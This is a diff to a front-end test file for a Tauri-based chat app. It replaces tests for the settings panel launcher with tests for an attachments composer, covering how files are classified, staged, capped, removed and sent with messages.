+    it('dock wiring is live: LunaDock.wire hooked this window (onMoved + dock-group listener)', () => {
+      expect(mockMe.onMoved).toHaveBeenCalled()
+      expect(windowEventHandlers['dock-group']).toBeTypeOf('function')
     })
   })
 
-  describe('Feature: Settings panel launchers', () => {
-    it('clicking the Updates tab opens the settings.updates panel and closes the modal', async () => {
-      // The launcher reads window.__TAURI__.core at CLICK time, so injecting
-      // the mock after boot exercises the real handler path.
-      const invoke = vi.fn(async () => 'panel-settings-updates')
-      ;(window as any).__TAURI__.core = { invoke }
+  // ───────────────────────────────────────────────────────────────────────────
+  // Feature: attachments composer (Phase-1 uploads, copied engine). FileReader
+  // paths run under REAL timers — jsdom delivers reader events async.
+  // ───────────────────────────────────────────────────────────────────────────
+  describe('Feature: attachments composer', () => {
+    const M = () => (window as any).__MoonInternals
+    const A = () => M().Attachments
 
-      const settingsPanel = document.getElementById('settings-panel') as HTMLElement
-      settingsPanel.classList.add('active') // modal open
-      const tab = document.querySelector('[data-panel-kind="settings.updates"]') as HTMLElement
-      expect(tab).toBeTruthy()
-      tab.click()
-
-      expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'settings.updates' })
-      expect(settingsPanel.classList.contains('active')).toBe(false)
-      // The launcher tab must NOT have stolen tabpanel selection: no
-      // tabpanel is associated with it, so the active one stays put.
-      expect(document.querySelector('.settings-tabpanel[data-tabpanel="updates"]')).toBeNull()
+    beforeEach(() => {
+      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
+      ;(window as any).cancelAnimationFrame = () => {}
+      M().ChatState.reset()
+      A().items = []
+      A().setError(null)
+      A().render()
     })
 
-    it('launcher degrades to a no-op off-Tauri (no core) without throwing', () => {
-      delete ((window as any).__TAURI__ as any).core
-      const settingsPanel = document.getElementById('settings-panel') as HTMLElement
-      settingsPanel.classList.add('active')
-      const tab = document.querySelector('[data-panel-kind="settings.updates"]') as HTMLElement
-      expect(() => tab.click()).not.toThrow()
-      expect(settingsPanel.classList.contains('active')).toBe(false)
+    it('classify() routes images / text / pdf / binary correctly', () => {
+      expect(A().classify({ type: 'image/png', name: 'shot.png' })).toBe('image')
+      expect(A().classify({ type: '', name: 'main.ts' })).toBe('text')
+      expect(A().classify({ type: 'text/plain', name: 'notes' })).toBe('text')
+      expect(A().classify({ type: 'application/pdf', name: 'doc.pdf' })).toBe('pdf')
+      expect(A().classify({ type: '', name: 'paper.pdf' })).toBe('pdf')
+      expect(A().classify({ type: 'application/octet-stream', name: 'blob.bin' })).toBe('binary')
+    })
+
+    it('an unsupported binary is declined with a visible error (no item staged)', async () => {
+      vi.useRealTimers()
+      await A().addFiles([new File(['x'], 'blob.bin', { type: 'application/octet-stream' })])
+      const err = document.getElementById('attach-error') as HTMLElement
+      expect(err.hidden).toBe(false)
+      expect(err.textContent).toContain("can't read blob.bin")
+      expect(A().items).toHaveLength(0)
+    })
+
+    it('a text file stages a chip, folds into the WIRE text, and stays out of the visible bubble', async () => {
+      vi.useRealTimers()
+      await A().addFiles([new File(['const x = 1'], 'snippet.ts', { type: 'text/plain' })])
+      expect(A().items).toHaveLength(1)
+
+      const strip = document.getElementById('attachments-strip') as HTMLElement
+      expect(strip.hidden).toBe(false)
+      expect(strip.querySelectorAll('.attachment-chip').length).toBe(1)
+      expect(strip.textContent).toContain('snippet.ts')
+
+      const m = M()
+      m.handleFrame({ type: 'thread-created', thread: { id: 'th-att' } })
+      const sendSpy = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})
+      const ta = document.getElementById('message-input') as HTMLTextAreaElement
+      ta.value = 'see attached'
+      document.getElementById('chat-form')!.dispatchEvent(
+        new Event('submit', { bubbles: true, cancelable: true }))
+
+      const um = sendSpy.mock.calls.find((c) => (c[0] as any).type === 'user-message')![0] as any
+      expect(um.text).toContain('see attached')
+      expect(um.text).toContain('<attached-file name="snippet.ts">')
+      expect(um.text).toContain('const x = 1')
+      // The visible bubble shows only the typed text + a preview chip.
+      const bubble = document.querySelector('#chat-messages .msg.user')!
+      expect(bubble.textContent).not.toContain('const x = 1')
+      expect(bubble.querySelector('.attachment-chip')).not.toBeNull()
+      // Composer state cleared after send.
+      expect(A().items).toHaveLength(0)
+      expect((document.getElementById('attachments-strip') as HTMLElement).hidden).toBe(true)
+    })
+
+    it('the × chip button removes a staged attachment', () => {
+      A().items = [{ id: 'att_1', kind: 'text', name: 'a.txt', text: 'hi' }]
+      A().render()
+      const strip = document.getElementById('attachments-strip') as HTMLElement
+      expect(strip.querySelectorAll('.attachment-chip').length).toBe(1)
+      ;(strip.querySelector('.att-remove') as HTMLButtonElement).click()
+      expect(A().items).toHaveLength(0)
+      expect(strip.hidden).toBe(true)
+    })
+
+    it('the per-turn cap (8) rejects the 9th file with a visible error', async () => {
+      vi.useRealTimers()
+      A().items = Array.from({ length: 8 }, (_, i) => ({
+        id: 'att_' + i, kind: 'text', name: i + '.txt', text: 'x',
+      }))
+      await A().addFiles([new File(['y'], 'ninth.txt', { type: 'text/plain' })])
+      expect(A().items).toHaveLength(8)
+      expect(document.getElementById('attach-error')!.textContent).toContain('Max 8 attachments')
+    })
+
+    it('wireAttachments() carries images/PDFs; textBlock() folds text files in XML tags', () => {
+      A().items = [
+        { id: '1', kind: 'image', name: 'p.png', mediaType: 'image/png', data: 'AAAA' },
+        { id: '2', kind: 'pdf', name: 'd.pdf', mediaType: 'application/pdf', data: 'BBBB' },
+        { id: '3', kind: 'text', name: 'n.md', text: '# hi' },
+      ]
+      expect(A().wireAttachments()).toEqual([
+        { mediaType: 'image/png', data: 'AAAA' },
+        { mediaType: 'application/pdf', data: 'BBBB' },
+      ])
+      expect(A().textBlock()).toBe('<attached-file name="n.md">\n# hi\n</attached-file>')
     })
   })
 })
